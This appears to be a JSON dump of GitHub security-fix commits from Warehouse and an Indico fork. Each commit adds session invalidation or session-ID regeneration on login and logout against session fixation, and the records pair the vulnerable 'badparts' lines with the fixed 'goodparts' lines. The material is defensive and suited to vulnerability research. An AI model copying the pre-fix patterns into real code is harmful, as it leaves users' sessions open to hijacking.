result=views.login(pyramid_request, _form_class=form_class) assert result=={\"form\": form_obj} assert form_class.calls==[ pretend.call( pyramid_request.POST, db=pyramid_request.db, password_hasher=pyramid_request.password_hasher, ), ] def test_post_invalid_returns_form(self, pyramid_request): pyramid_request.method=\"POST\" pyramid_request.db=pretend.stub() pyramid_request.password_hasher=pretend.stub() form_obj=pretend.stub(validate=pretend.call_recorder(lambda: False)) form_class=pretend.call_recorder( lambda d, db, password_hasher: form_obj ) result=views.login(pyramid_request, _form_class=form_class) assert result=={\"form\": form_obj} assert form_class.calls==[ pretend.call( pyramid_request.POST, db=pyramid_request.db, password_hasher=pyramid_request.password_hasher, ), ] assert form_obj.validate.calls==[pretend.call()] def test_post_validate_redirects(self, monkeypatch, pyramid_request): remember=pretend.call_recorder( lambda request, user_id:[(\"foo\", \"bar\")] ) monkeypatch.setattr(views, \"remember\", remember) pyramid_request.method=\"POST\" pyramid_request.db=pretend.stub() pyramid_request.password_hasher=pretend.stub() pyramid_request.session=pretend.stub( new_csrf_token=pretend.call_recorder(lambda: None) ) form_obj=pretend.stub( validate=pretend.call_recorder(lambda: True), user=pretend.stub(id=1), ) form_class=pretend.call_recorder( lambda d, db, password_hasher: form_obj ) result=views.login(pyramid_request, _form_class=form_class) assert isinstance(result, HTTPSeeOther) assert result.headers[\"Location\"]==\"\/\" assert form_class.calls==[ pretend.call( pyramid_request.POST, db=pyramid_request.db, password_hasher=pyramid_request.password_hasher, ), ] assert form_obj.validate.calls==[pretend.call()] assert remember.calls==[pretend.call(pyramid_request, 1)] assert pyramid_request.session.new_csrf_token.calls==[pretend.call()] assert(\"foo\", \"bar\") in pyramid_request.response.headerlist class TestLogout: def test_get_returns_empty(self, pyramid_request): assert views.logout(pyramid_request)=={} def test_post_forgets_user(self, monkeypatch, pyramid_request): forget=pretend.call_recorder(lambda request:[(\"foo\", \"bar\")]) monkeypatch.setattr(views, \"forget\", forget) pyramid_request.method=\"POST\" result=views.logout(pyramid_request) assert isinstance(result, HTTPSeeOther) assert result.headers[\"Location\"]==\"\/\" assert forget.calls==[pretend.call(pyramid_request)] assert(\"foo\", \"bar\") in pyramid_request.response.headerlist ","sourceWithComments":"# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport pretend\nimport pytest\n\nfrom pyramid.httpexceptions import (\n    HTTPMovedPermanently, HTTPNotFound, HTTPSeeOther,\n)\n\nfrom warehouse.accounts import views\n\nfrom ..common.db.accounts import UserFactory\n\n\nclass TestUserProfile:\n\n    def test_no_user(self, db_request):\n        with pytest.raises(HTTPNotFound):\n            views.profile(db_request, \"non-existent-user\")\n\n    def test_user_redirects_username(self, db_request):\n        user = UserFactory.create(session=db_request.db)\n\n        if user.username.upper() != user.username:\n            username = user.username.upper()\n        else:\n            username = user.username.lower()\n\n        db_request.current_route_url = pretend.call_recorder(\n            lambda username: \"\/user\/the-redirect\/\"\n        )\n\n        result = views.profile(db_request, username)\n\n        assert isinstance(result, HTTPMovedPermanently)\n        assert result.headers[\"Location\"] == \"\/user\/the-redirect\/\"\n        assert db_request.current_route_url.calls == [\n            pretend.call(username=user.username),\n        ]\n\n    def test_returns_user(self, db_request):\n        user = UserFactory.create(session=db_request.db)\n        assert views.profile(db_request, user.username) == {\"user\": user}\n\n\nclass TestLogin:\n\n    def test_get_returns_form(self, pyramid_request):\n        pyramid_request.db = pretend.stub()\n        pyramid_request.password_hasher = pretend.stub()\n        form_obj = pretend.stub()\n        form_class = pretend.call_recorder(\n            lambda d, db, password_hasher: form_obj\n        )\n\n        result = views.login(pyramid_request, _form_class=form_class)\n\n        assert result == {\"form\": form_obj}\n        assert form_class.calls == [\n            pretend.call(\n                pyramid_request.POST,\n                db=pyramid_request.db,\n                password_hasher=pyramid_request.password_hasher,\n            ),\n        ]\n\n    def test_post_invalid_returns_form(self, pyramid_request):\n        pyramid_request.method = \"POST\"\n        pyramid_request.db = pretend.stub()\n        pyramid_request.password_hasher = pretend.stub()\n        form_obj = pretend.stub(validate=pretend.call_recorder(lambda: False))\n        form_class = pretend.call_recorder(\n            lambda d, db, password_hasher: form_obj\n        )\n\n        result = views.login(pyramid_request, _form_class=form_class)\n\n        assert result == {\"form\": form_obj}\n        assert form_class.calls == [\n            pretend.call(\n                pyramid_request.POST,\n                db=pyramid_request.db,\n                password_hasher=pyramid_request.password_hasher,\n            ),\n        ]\n        assert form_obj.validate.calls == [pretend.call()]\n\n    def test_post_validate_redirects(self, monkeypatch, pyramid_request):\n        remember = pretend.call_recorder(\n            lambda request, user_id: [(\"foo\", \"bar\")]\n        )\n        monkeypatch.setattr(views, \"remember\", remember)\n\n        pyramid_request.method = \"POST\"\n        pyramid_request.db = pretend.stub()\n        pyramid_request.password_hasher = pretend.stub()\n        pyramid_request.session = pretend.stub(\n            new_csrf_token=pretend.call_recorder(lambda: None)\n        )\n\n        form_obj = pretend.stub(\n            validate=pretend.call_recorder(lambda: True),\n            user=pretend.stub(id=1),\n        )\n        form_class = pretend.call_recorder(\n            lambda d, db, password_hasher: form_obj\n        )\n\n        result = views.login(pyramid_request, _form_class=form_class)\n\n        assert isinstance(result, HTTPSeeOther)\n        assert result.headers[\"Location\"] == \"\/\"\n        assert form_class.calls == [\n            pretend.call(\n                pyramid_request.POST,\n                db=pyramid_request.db,\n                password_hasher=pyramid_request.password_hasher,\n            ),\n        ]\n        assert form_obj.validate.calls == [pretend.call()]\n        assert remember.calls == [pretend.call(pyramid_request, 1)]\n        assert pyramid_request.session.new_csrf_token.calls == [pretend.call()]\n        assert (\"foo\", \"bar\") in pyramid_request.response.headerlist\n\n\nclass TestLogout:\n\n    def test_get_returns_empty(self, pyramid_request):\n        assert views.logout(pyramid_request) == {}\n\n    def test_post_forgets_user(self, monkeypatch, pyramid_request):\n        forget = pretend.call_recorder(lambda request: [(\"foo\", \"bar\")])\n        monkeypatch.setattr(views, \"forget\", forget)\n\n        pyramid_request.method = \"POST\"\n\n        result = views.logout(pyramid_request)\n\n        assert isinstance(result, HTTPSeeOther)\n        assert result.headers[\"Location\"] == \"\/\"\n        assert forget.calls == [pretend.call(pyramid_request)]\n        assert (\"foo\", \"bar\") in pyramid_request.response.headerlist\n"}},"msg":"Protect against session fixation and session data leakage"}},"https:\/\/github.com\/startnayit\/warehouse":{"6c7ebab691bcec56724e8b3d82583514f06be79d":{"url":"https:\/\/api.github.com\/repos\/startnayit\/warehouse\/commits\/6c7ebab691bcec56724e8b3d82583514f06be79d","html_url":"https:\/\/github.com\/startnayit\/warehouse\/commit\/6c7ebab691bcec56724e8b3d82583514f06be79d","sha":"6c7ebab691bcec56724e8b3d82583514f06be79d","keyword":"session fixation protect","diff":"diff --git a\/tests\/accounts\/test_views.py b\/tests\/accounts\/test_views.py\nindex 1721d767..457e1e92 100644\n--- a\/tests\/accounts\/test_views.py\n+++ b\/tests\/accounts\/test_views.py\n@@ -95,17 +95,29 @@ def test_post_invalid_returns_form(self, pyramid_request):\n         ]\n         assert form_obj.validate.calls == [pretend.call()]\n \n-    def test_post_validate_redirects(self, monkeypatch, pyramid_request):\n+    @pytest.mark.parametrize(\"with_user\", [True, False])\n+    def test_post_validate_redirects(self, monkeypatch, pyramid_request,\n+                                     with_user):\n         remember = pretend.call_recorder(\n             lambda request, user_id: [(\"foo\", \"bar\")]\n         )\n         monkeypatch.setattr(views, \"remember\", remember)\n \n+        new_session = {}\n+\n         pyramid_request.method = \"POST\"\n         pyramid_request.db = pretend.stub()\n         pyramid_request.password_hasher = pretend.stub()\n         pyramid_request.session = pretend.stub(\n-            new_csrf_token=pretend.call_recorder(lambda: None)\n+            items=lambda: [(\"a\", \"b\"), (\"foo\", \"bar\")],\n+            update=new_session.update,\n+            invalidate=pretend.call_recorder(lambda: None),\n+            new_csrf_token=pretend.call_recorder(lambda: None),\n+        )\n+\n+        pyramid_request.set_property(\n+            lambda r: 1234 if with_user else None,\n+            name=\"unauthenticated_userid\",\n         )\n \n         form_obj = pretend.stub(\n@@ -128,6 +140,11 @@ def test_post_validate_redirects(self, monkeypatch, pyramid_request):\n             ),\n         ]\n         assert form_obj.validate.calls == [pretend.call()]\n+        if with_user:\n+            assert new_session == {}\n+        else:\n+            assert new_session == {\"a\": \"b\", \"foo\": \"bar\"}\n+        assert pyramid_request.session.invalidate.calls == [pretend.call()]\n         assert remember.calls == [pretend.call(pyramid_request, 1)]\n         assert pyramid_request.session.new_csrf_token.calls == [pretend.call()]\n         assert (\"foo\", \"bar\") in pyramid_request.response.headerlist\n@@ -143,10 +160,14 @@ def test_post_forgets_user(self, monkeypatch, pyramid_request):\n         monkeypatch.setattr(views, \"forget\", forget)\n \n         pyramid_request.method = \"POST\"\n+        pyramid_request.session = pretend.stub(\n+            invalidate=pretend.call_recorder(lambda: None),\n+        )\n \n         result = views.logout(pyramid_request)\n \n         assert isinstance(result, HTTPSeeOther)\n         assert result.headers[\"Location\"] == \"\/\"\n         assert forget.calls == [pretend.call(pyramid_request)]\n+        assert pyramid_request.session.invalidate.calls == [pretend.call()]\n         assert (\"foo\", \"bar\") in pyramid_request.response.headerlist\ndiff --git a\/warehouse\/accounts\/views.py b\/warehouse\/accounts\/views.py\nindex ab3c6fa8..e4911adf 100644\n--- a\/warehouse\/accounts\/views.py\n+++ b\/warehouse\/accounts\/views.py\n@@ -66,6 +66,33 @@ def login(request, _form_class=LoginForm):\n     )\n \n     if request.method == \"POST\" and form.validate():\n+        # We have a session factory associated with this request, so in order\n+        # to protect against session fixation attacks we're going to make sure\n+        # that we create a new session (which for sessions with an identifier\n+        # will cause it to get a new session identifier).\n+\n+        # We need to protect against session fixation attacks, so make sure\n+        # that we create a new session (which will cause it to get a new\n+        # session identifier).\n+        # TODO: This should be removed once\/if Pylons\/pyramid#1570 gets merged\n+        #       to handle this for us.\n+        if (request.unauthenticated_userid is not None\n+                and request.unauthenticated_userid != form.user.id):\n+            # There is already a userid associated with this request and it is\n+            # a different userid than the one we're trying to remember now. In\n+            # this case we want to drop the existing session completely because\n+            # we don't want to leak any data between authenticated userids.\n+            request.session.invalidate()\n+        else:\n+            # We either do not have an associated userid with this request\n+            # already, or the userid is the same one we're trying to remember\n+            # now. In either case we want to keep all of the data but we want\n+            # to make sure that we create a new session since we're crossing\n+            # a privilege boundary.\n+            data = dict(request.session.items())\n+            request.session.invalidate()\n+            request.session.update(data)\n+\n         # Remember the userid using the authentication policy.\n         headers = remember(request, form.user.id)\n         request.response.headerlist.extend(headers)\n@@ -102,6 +129,18 @@ def logout(request):\n         headers = forget(request)\n         request.response.headerlist.extend(headers)\n \n+        # When crossing an authentication boundry we want to create a new\n+        # session identifier. We don't want to keep any information in the\n+        # session when going from authenticated to unauthenticated because\n+        # user's generally expect that logging out is a desctructive action\n+        # that erases all of their private data. However if we don't clear the\n+        # session then another user can use the computer after them, log in to\n+        # their account, and then gain access to anything sensitive stored in\n+        # the session for the original user.\n+        # TODO: This should be removed once\/if Pylons\/pyramid#1570 gets merged\n+        #       to handle this for us.\n+        request.session.invalidate()\n+\n         # Now that we're logged out we'll want to redirect the user to either\n         # where they were originally, or to the default view.\n         # TODO: Implement ?next= support.\n","message":"","files":{"\/tests\/accounts\/test_views.py":{"changes":[{"diff":"\n         ]\n         assert form_obj.validate.calls == [pretend.call()]\n \n-    def test_post_validate_redirects(self, monkeypatch, pyramid_request):\n+    @pytest.mark.parametrize(\"with_user\", [True, False])\n+    def test_post_validate_redirects(self, monkeypatch, pyramid_request,\n+                                     with_user):\n         remember = pretend.call_recorder(\n             lambda request, user_id: [(\"foo\", \"bar\")]\n         )\n         monkeypatch.setattr(views, \"remember\", remember)\n \n+        new_session = {}\n+\n         pyramid_request.method = \"POST\"\n         pyramid_request.db = pretend.stub()\n         pyramid_request.password_hasher = pretend.stub()\n         pyramid_request.session = pretend.stub(\n-            new_csrf_token=pretend.call_recorder(lambda: None)\n+            items=lambda: [(\"a\", \"b\"), (\"foo\", \"bar\")],\n+            update=new_session.update,\n+            invalidate=pretend.call_recorder(lambda: None),\n+            new_csrf_token=pretend.call_recorder(lambda: None),\n+        )\n+\n+        pyramid_request.set_property(\n+            lambda r: 1234 if with_user else None,\n+            name=\"unauthenticated_userid\",\n         )\n \n         form_obj = pretend.stub(\n","add":14,"remove":2,"filename":"\/tests\/accounts\/test_views.py","badparts":["    def test_post_validate_redirects(self, monkeypatch, pyramid_request):","            new_csrf_token=pretend.call_recorder(lambda: None)"],"goodparts":["    @pytest.mark.parametrize(\"with_user\", [True, False])","    def test_post_validate_redirects(self, monkeypatch, pyramid_request,","                                     with_user):","        new_session = {}","            items=lambda: [(\"a\", \"b\"), (\"foo\", \"bar\")],","            update=new_session.update,","            invalidate=pretend.call_recorder(lambda: None),","            new_csrf_token=pretend.call_recorder(lambda: None),","        )","        pyramid_request.set_property(","            lambda r: 1234 if with_user else None,","            name=\"unauthenticated_userid\","]},{"diff":"\n         ]\n         assert form_obj.validate.calls == [pretend.call()]\n \n-    def test_post_validate_redirects(self, monkeypatch, pyramid_request):\n+    @pytest.mark.parametrize(\"with_user\", [True, False])\n+    def test_post_validate_redirects(self, monkeypatch, pyramid_request,\n+                                     with_user):\n         remember = pretend.call_recorder(\n             lambda request, user_id: [(\"foo\", \"bar\")]\n         )\n         monkeypatch.setattr(views, \"remember\", remember)\n \n+        new_session = {}\n+\n         pyramid_request.method = \"POST\"\n         pyramid_request.db = pretend.stub()\n         pyramid_request.password_hasher = pretend.stub()\n         pyramid_request.session = pretend.stub(\n-            new_csrf_token=pretend.call_recorder(lambda: None)\n+            items=lambda: [(\"a\", \"b\"), (\"foo\", \"bar\")],\n+            update=new_session.update,\n+            invalidate=pretend.call_recorder(lambda: None),\n+            new_csrf_token=pretend.call_recorder(lambda: None),\n+        )\n+\n+        pyramid_request.set_property(\n+            lambda r: 1234 if with_user else None,\n+            name=\"unauthenticated_userid\",\n         )\n \n         form_obj = pretend.stub(\n","add":14,"remove":2,"filename":"\/tests\/accounts\/test_views.py","badparts":["    def test_post_validate_redirects(self, monkeypatch, pyramid_request):","            new_csrf_token=pretend.call_recorder(lambda: None)"],"goodparts":["    @pytest.mark.parametrize(\"with_user\", [True, False])","    def test_post_validate_redirects(self, monkeypatch, pyramid_request,","                                     with_user):","        new_session = {}","            items=lambda: [(\"a\", \"b\"), (\"foo\", \"bar\")],","            update=new_session.update,","            invalidate=pretend.call_recorder(lambda: None),","            new_csrf_token=pretend.call_recorder(lambda: None),","        )","        pyramid_request.set_property(","            lambda r: 1234 if with_user else None,","            name=\"unauthenticated_userid\","]}],"source":"\n import pretend import pytest from pyramid.httpexceptions import( HTTPMovedPermanently, HTTPNotFound, HTTPSeeOther, ) from warehouse.accounts import views from..common.db.accounts import UserFactory class TestUserProfile: def test_no_user(self, db_request): with pytest.raises(HTTPNotFound): views.profile(db_request, \"non-existent-user\") def test_user_redirects_username(self, db_request): user=UserFactory.create(session=db_request.db) if user.username.upper() !=user.username: username=user.username.upper() else: username=user.username.lower() db_request.current_route_url=pretend.call_recorder( lambda username: \"\/user\/the-redirect\/\" ) result=views.profile(db_request, username) assert isinstance(result, HTTPMovedPermanently) assert result.headers[\"Location\"]==\"\/user\/the-redirect\/\" assert db_request.current_route_url.calls==[ pretend.call(username=user.username), ] def test_returns_user(self, db_request): user=UserFactory.create(session=db_request.db) assert views.profile(db_request, user.username)=={\"user\": user} class TestLogin: def test_get_returns_form(self, pyramid_request): pyramid_request.db=pretend.stub() pyramid_request.password_hasher=pretend.stub() form_obj=pretend.stub() form_class=pretend.call_recorder( lambda d, db, password_hasher: form_obj ) result=views.login(pyramid_request, _form_class=form_class) assert result=={\"form\": form_obj} assert form_class.calls==[ pretend.call( pyramid_request.POST, db=pyramid_request.db, password_hasher=pyramid_request.password_hasher, ), ] def test_post_invalid_returns_form(self, pyramid_request): pyramid_request.method=\"POST\" pyramid_request.db=pretend.stub() pyramid_request.password_hasher=pretend.stub() form_obj=pretend.stub(validate=pretend.call_recorder(lambda: False)) form_class=pretend.call_recorder( lambda d, db, password_hasher: form_obj ) result=views.login(pyramid_request, _form_class=form_class) assert result=={\"form\": form_obj} assert form_class.calls==[ pretend.call( pyramid_request.POST, db=pyramid_request.db, password_hasher=pyramid_request.password_hasher, ), ] assert form_obj.validate.calls==[pretend.call()] def test_post_validate_redirects(self, monkeypatch, pyramid_request): remember=pretend.call_recorder( lambda request, user_id:[(\"foo\", \"bar\")] ) monkeypatch.setattr(views, \"remember\", remember) pyramid_request.method=\"POST\" pyramid_request.db=pretend.stub() pyramid_request.password_hasher=pretend.stub() pyramid_request.session=pretend.stub( new_csrf_token=pretend.call_recorder(lambda: None) ) form_obj=pretend.stub( validate=pretend.call_recorder(lambda: True), user=pretend.stub(id=1), ) form_class=pretend.call_recorder( lambda d, db, password_hasher: form_obj ) result=views.login(pyramid_request, _form_class=form_class) assert isinstance(result, HTTPSeeOther) assert result.headers[\"Location\"]==\"\/\" assert form_class.calls==[ pretend.call( pyramid_request.POST, db=pyramid_request.db, password_hasher=pyramid_request.password_hasher, ), ] assert form_obj.validate.calls==[pretend.call()] assert remember.calls==[pretend.call(pyramid_request, 1)] assert pyramid_request.session.new_csrf_token.calls==[pretend.call()] assert(\"foo\", \"bar\") in pyramid_request.response.headerlist class TestLogout: def test_get_returns_empty(self, pyramid_request): assert views.logout(pyramid_request)=={} def test_post_forgets_user(self, monkeypatch, pyramid_request): forget=pretend.call_recorder(lambda request:[(\"foo\", \"bar\")]) monkeypatch.setattr(views, \"forget\", forget) pyramid_request.method=\"POST\" result=views.logout(pyramid_request) assert isinstance(result, HTTPSeeOther) assert result.headers[\"Location\"]==\"\/\" assert forget.calls==[pretend.call(pyramid_request)] assert(\"foo\", \"bar\") in pyramid_request.response.headerlist ","sourceWithComments":"# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport pretend\nimport pytest\n\nfrom pyramid.httpexceptions import (\n    HTTPMovedPermanently, HTTPNotFound, HTTPSeeOther,\n)\n\nfrom warehouse.accounts import views\n\nfrom ..common.db.accounts import UserFactory\n\n\nclass TestUserProfile:\n\n    def test_no_user(self, db_request):\n        with pytest.raises(HTTPNotFound):\n            views.profile(db_request, \"non-existent-user\")\n\n    def test_user_redirects_username(self, db_request):\n        user = UserFactory.create(session=db_request.db)\n\n        if user.username.upper() != user.username:\n            username = user.username.upper()\n        else:\n            username = user.username.lower()\n\n        db_request.current_route_url = pretend.call_recorder(\n            lambda username: \"\/user\/the-redirect\/\"\n        )\n\n        result = views.profile(db_request, username)\n\n        assert isinstance(result, HTTPMovedPermanently)\n        assert result.headers[\"Location\"] == \"\/user\/the-redirect\/\"\n        assert db_request.current_route_url.calls == [\n            pretend.call(username=user.username),\n        ]\n\n    def test_returns_user(self, db_request):\n        user = UserFactory.create(session=db_request.db)\n        assert views.profile(db_request, user.username) == {\"user\": user}\n\n\nclass TestLogin:\n\n    def test_get_returns_form(self, pyramid_request):\n        pyramid_request.db = pretend.stub()\n        pyramid_request.password_hasher = pretend.stub()\n        form_obj = pretend.stub()\n        form_class = pretend.call_recorder(\n            lambda d, db, password_hasher: form_obj\n        )\n\n        result = views.login(pyramid_request, _form_class=form_class)\n\n        assert result == {\"form\": form_obj}\n        assert form_class.calls == [\n            pretend.call(\n                pyramid_request.POST,\n                db=pyramid_request.db,\n                password_hasher=pyramid_request.password_hasher,\n            ),\n        ]\n\n    def test_post_invalid_returns_form(self, pyramid_request):\n        pyramid_request.method = \"POST\"\n        pyramid_request.db = pretend.stub()\n        pyramid_request.password_hasher = pretend.stub()\n        form_obj = pretend.stub(validate=pretend.call_recorder(lambda: False))\n        form_class = pretend.call_recorder(\n            lambda d, db, password_hasher: form_obj\n        )\n\n        result = views.login(pyramid_request, _form_class=form_class)\n\n        assert result == {\"form\": form_obj}\n        assert form_class.calls == [\n            pretend.call(\n                pyramid_request.POST,\n                db=pyramid_request.db,\n                password_hasher=pyramid_request.password_hasher,\n            ),\n        ]\n        assert form_obj.validate.calls == [pretend.call()]\n\n    def test_post_validate_redirects(self, monkeypatch, pyramid_request):\n        remember = pretend.call_recorder(\n            lambda request, user_id: [(\"foo\", \"bar\")]\n        )\n        monkeypatch.setattr(views, \"remember\", remember)\n\n        pyramid_request.method = \"POST\"\n        pyramid_request.db = pretend.stub()\n        pyramid_request.password_hasher = pretend.stub()\n        pyramid_request.session = pretend.stub(\n            new_csrf_token=pretend.call_recorder(lambda: None)\n        )\n\n        form_obj = pretend.stub(\n            validate=pretend.call_recorder(lambda: True),\n            user=pretend.stub(id=1),\n        )\n        form_class = pretend.call_recorder(\n            lambda d, db, password_hasher: form_obj\n        )\n\n        result = views.login(pyramid_request, _form_class=form_class)\n\n        assert isinstance(result, HTTPSeeOther)\n        assert result.headers[\"Location\"] == \"\/\"\n        assert form_class.calls == [\n            pretend.call(\n                pyramid_request.POST,\n                db=pyramid_request.db,\n                password_hasher=pyramid_request.password_hasher,\n            ),\n        ]\n        assert form_obj.validate.calls == [pretend.call()]\n        assert remember.calls == [pretend.call(pyramid_request, 1)]\n        assert pyramid_request.session.new_csrf_token.calls == [pretend.call()]\n        assert (\"foo\", \"bar\") in pyramid_request.response.headerlist\n\n\nclass TestLogout:\n\n    def test_get_returns_empty(self, pyramid_request):\n        assert views.logout(pyramid_request) == {}\n\n    def test_post_forgets_user(self, monkeypatch, pyramid_request):\n        forget = pretend.call_recorder(lambda request: [(\"foo\", \"bar\")])\n        monkeypatch.setattr(views, \"forget\", forget)\n\n        pyramid_request.method = \"POST\"\n\n        result = views.logout(pyramid_request)\n\n        assert isinstance(result, HTTPSeeOther)\n        assert result.headers[\"Location\"] == \"\/\"\n        assert forget.calls == [pretend.call(pyramid_request)]\n        assert (\"foo\", \"bar\") in pyramid_request.response.headerlist\n"}},"msg":"Protect against session fixation and session data leakage"}},"https:\/\/github.com\/cbnusw\/cbnu_indico":{"f94958bcf8d5e23264ab5a0d257f6a637be64e7b":{"url":"https:\/\/api.github.com\/repos\/cbnusw\/cbnu_indico\/commits\/f94958bcf8d5e23264ab5a0d257f6a637be64e7b","html_url":"https:\/\/github.com\/cbnusw\/cbnu_indico\/commit\/f94958bcf8d5e23264ab5a0d257f6a637be64e7b","message":"Regenerate sid on login\/logout\n\nPrevents \"cookie tossing\" \/ session fixation","sha":"f94958bcf8d5e23264ab5a0d257f6a637be64e7b","keyword":"session fixation prevent","diff":"diff --git a\/indico\/web\/flask\/session.py b\/indico\/web\/flask\/session.py\nindex c0a89b0475..62bf31c26d 100644\n--- a\/indico\/web\/flask\/session.py\n+++ b\/indico\/web\/flask\/session.py\n@@ -81,6 +81,7 @@ def user(self, user):\n             self.pop('_user_id', None)\n         else:\n             self['_user_id'] = user.id\n+        self._refresh_sid = True\n \n     @property\n     def avatar(self):\n@@ -153,7 +154,11 @@ def should_refresh_session(self, app, session):\n         return session['_expires'] - datetime.now() < threshold\n \n     def should_refresh_sid(self, app, session):\n-        return self.get_cookie_secure(app) and not session.get('_secure')\n+        if self.get_cookie_secure(app) and not session.get('_secure'):\n+            return True\n+        if getattr(session, '_refresh_sid', False):\n+            return True\n+        return False\n \n     def open_session(self, app, request):\n         sid = request.cookies.get(app.session_cookie_name)\n","files":{"\/indico\/web\/flask\/session.py":{"changes":[{"diff":"\n         return session['_expires'] - datetime.now() < threshold\n \n     def should_refresh_sid(self, app, session):\n-        return self.get_cookie_secure(app) and not session.get('_secure')\n+        if self.get_cookie_secure(app) and not session.get('_secure'):\n+            return True\n+        if getattr(session, '_refresh_sid', False):\n+            return True\n+        return False\n \n     def open_session(self, app, request):\n         sid = request.cookies.get(app.session_cookie_name)\n","add":5,"remove":1,"filename":"\/indico\/web\/flask\/session.py","badparts":["        return self.get_cookie_secure(app) and not session.get('_secure')"],"goodparts":["        if self.get_cookie_secure(app) and not session.get('_secure'):","            return True","        if getattr(session, '_refresh_sid', False):","            return True","        return False"]},{"diff":"\n         return session['_expires'] - datetime.now() < threshold\n \n     def should_refresh_sid(self, app, session):\n-        return self.get_cookie_secure(app) and not session.get('_secure')\n+        if self.get_cookie_secure(app) and not session.get('_secure'):\n+            return True\n+        if getattr(session, '_refresh_sid', False):\n+            return True\n+        return False\n \n     def open_session(self, app, request):\n         sid = request.cookies.get(app.session_cookie_name)\n","add":5,"remove":1,"filename":"\/indico\/web\/flask\/session.py","badparts":["        return self.get_cookie_secure(app) and not session.get('_secure')"],"goodparts":["        if self.get_cookie_secure(app) and not session.get('_secure'):","            return True","        if getattr(session, '_refresh_sid', False):","            return True","        return False"]}],"source":"\n from __future__ import absolute_import import cPickle import uuid from datetime import datetime, timedelta from flask import request, flash from flask.sessions import SessionInterface, SessionMixin from markupsafe import Markup from werkzeug.datastructures import CallbackDict from werkzeug.utils import cached_property from indico.core.config import Config from indico.modules.users import User from indico.util.decorators import cached_writable_property from indico.util.i18n import _ from MaKaC.common.cache import GenericCache class BaseSession(CallbackDict, SessionMixin): def __init__(self, initial=None, sid=None, new=False): def on_update(self): self.modified=True CallbackDict.__init__(self, initial, on_update) self.sid=sid self.new=new self.modified=False defaults=self._get_defaults() if defaults: self.update(defaults) def _get_defaults(self): return None class IndicoSession(BaseSession): @cached_writable_property('_user') def user(self): user_id=self.get('_user_id') user=User.get(user_id) if user_id is not None else None if user and user.is_deleted: merged_into_user=user.merged_into_user user=None if not request.is_xhr and request.blueprint !='assets': self.clear() if merged_into_user: msg=_(u'Your profile has been merged into <strong>{}<\/strong>. ' u'Please log in using that profile.') flash(Markup(msg).format(merged_into_user.full_name), 'warning') else: flash(_(u'Your profile has been deleted.'), 'error') return user @user.setter def user(self, user): if user is None: self.pop('_user_id', None) else: self['_user_id']=user.id @property def avatar(self): return self.user.as_avatar if self.user else None @property def lang(self): if '_lang' in self: return self['_lang'] elif self.user: return self.user.settings.get('lang') else: return None @lang.setter def lang(self, lang): self['_lang']=lang @cached_property def csrf_token(self): if '_csrf_token' not in self: self['_csrf_token']=str(uuid.uuid4()) return self['_csrf_token'] @property def csrf_protected(self): return self.user is not None @property def timezone(self): if '_timezone' in self: return self['_timezone'] if '_user_id' not in self: return 'LOCAL' return Config.getInstance().getDefaultTimezone() @timezone.setter def timezone(self, tz): self['_timezone']=tz class IndicoSessionInterface(SessionInterface): pickle_based=True serializer=cPickle session_class=IndicoSession temporary_session_lifetime=timedelta(days=7) def __init__(self): self.storage=GenericCache('flask-session') def generate_sid(self): return str(uuid.uuid4()) def get_cookie_secure(self, app): return request.is_secure def get_storage_lifetime(self, app, session): if session.permanent: return app.permanent_session_lifetime else: return self.temporary_session_lifetime def should_refresh_session(self, app, session): if session.new or '_expires' not in session: return False threshold=self.get_storage_lifetime(app, session) \/ 2 return session['_expires'] -datetime.now() < threshold def should_refresh_sid(self, app, session): return self.get_cookie_secure(app) and not session.get('_secure') def open_session(self, app, request): sid=request.cookies.get(app.session_cookie_name) if not sid: return self.session_class(sid=self.generate_sid(), new=True) data=self.storage.get(sid) if data is not None: return self.session_class(self.serializer.loads(data), sid=sid) return self.session_class(sid=self.generate_sid(), new=True) def save_session(self, app, session, response): domain=self.get_cookie_domain(app) secure=self.get_cookie_secure(app) refresh_sid=self.should_refresh_sid(app, session) if not session and not session.new: self.storage.delete(session.sid) response.delete_cookie(app.session_cookie_name, domain=domain) return if not refresh_sid and not session.modified and not self.should_refresh_session(app, session): return if app.config['INDICO_SESSION_PERMANENT']: session.permanent=True storage_ttl=self.get_storage_lifetime(app, session) cookie_lifetime=self.get_expiration_time(app, session) session['_expires']=datetime.now() +storage_ttl if refresh_sid: self.storage.delete(session.sid) session.sid=self.generate_sid() session['_secure']=request.is_secure self.storage.set(session.sid, self.serializer.dumps(dict(session)), storage_ttl) response.set_cookie(app.session_cookie_name, session.sid, expires=cookie_lifetime, httponly=True, secure=secure) ","sourceWithComments":"# This file is part of Indico.\n# Copyright (C) 2002 - 2015 European Organization for Nuclear Research (CERN).\n#\n# Indico is free software; you can redistribute it and\/or\n# modify it under the terms of the GNU General Public License as\n# published by the Free Software Foundation; either version 3 of the\n# License, or (at your option) any later version.\n#\n# Indico is distributed in the hope that it will be useful, but\n# WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Indico; if not, see <http:\/\/www.gnu.org\/licenses\/>.\n\nfrom __future__ import absolute_import\n\nimport cPickle\nimport uuid\nfrom datetime import datetime, timedelta\n\nfrom flask import request, flash\nfrom flask.sessions import SessionInterface, SessionMixin\nfrom markupsafe import Markup\nfrom werkzeug.datastructures import CallbackDict\nfrom werkzeug.utils import cached_property\n\nfrom indico.core.config import Config\nfrom indico.modules.users import User\nfrom indico.util.decorators import cached_writable_property\nfrom indico.util.i18n import _\nfrom MaKaC.common.cache import GenericCache\n\n\nclass BaseSession(CallbackDict, SessionMixin):\n    def __init__(self, initial=None, sid=None, new=False):\n        def on_update(self):\n            self.modified = True\n        CallbackDict.__init__(self, initial, on_update)\n        self.sid = sid\n        self.new 